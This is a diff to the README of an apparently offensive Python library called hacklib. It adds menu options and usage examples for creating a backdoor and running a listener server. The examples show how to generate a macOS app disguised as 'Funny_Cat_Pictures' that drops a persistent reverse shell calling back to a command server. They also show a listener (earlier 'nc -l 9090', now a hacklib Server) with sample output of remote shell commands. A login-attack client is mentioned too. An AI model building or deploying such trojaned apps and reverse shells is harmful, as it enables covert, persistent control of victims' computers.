@@ -24,7 +24,9 @@ Enter the number corresponding to your choice.
 1) Connect to a proxy
 2) Target an IP or URL
 3) Lan Scan
-4) Exit
+4) Create Backdoor
+5) Server
+6) Exit
 
 ```
 Or if you got it using pip:
@@ -46,14 +48,21 @@ Reverse shell backdooring (Currently only for Macs):
 import hacklib
 
 bd = hacklib.Backdoor()
-# Generates an app that drops a persistent reverse shell into the system.
+# Generates an app that, when ran, drops a persistent reverse shell into the system.
 bd.create('127.0.0.1', 9090, 'OSX', 'Funny_Cat_Pictures')
 # Takes the IP and port of the command server, the OS of the target, and the name of the .app
 ```
 
-Listen for connections with netcat:
-```
-nc -l 9090
+Listen for connections with Server:
+```python
+>>> import hacklib
+>>> s = hacklib.Server(9091) # Bind server to port 9091
+>>> s.listen() 
+New connection ('127.0.0.1', 50011) # Prints this when a computer connects
+bash: no job control in this shell
+bash$ whoami # Type a command
+leon
+bash$ # Nice!
 ```
 -
 Universal login client for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
